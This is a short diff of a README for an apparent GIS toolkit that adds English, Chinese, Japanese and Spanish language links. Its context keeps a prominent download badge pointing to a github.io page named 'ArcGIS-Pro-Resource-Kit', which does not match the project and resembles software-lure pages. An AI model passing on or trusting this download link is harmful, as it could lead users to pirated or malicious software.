@@ -1,5 +1,9 @@
 # GeoSpatial Intelligence Workbench 2026: Professional GIS Toolkit for Advanced Mapping and Spatial Analytics
 
+<!-- hy-mt2-i18n:start -->
+**English** | [中文](./README_zh-CN.md) | [日本語](./README_ja.md) | [Español](./README_es.md)
+<!-- hy-mt2-i18n:end -->
+
 [![Download](https://img.shields.io/badge/Download%20Link-brightgreen?style=for-the-badge&logo=github)](https://42web-kenya.github.io/ArcGIS-Pro-Resource-Kit/)
 
 ## Transform Raw Geodata into Actionable Intelligence with Precision and Speed
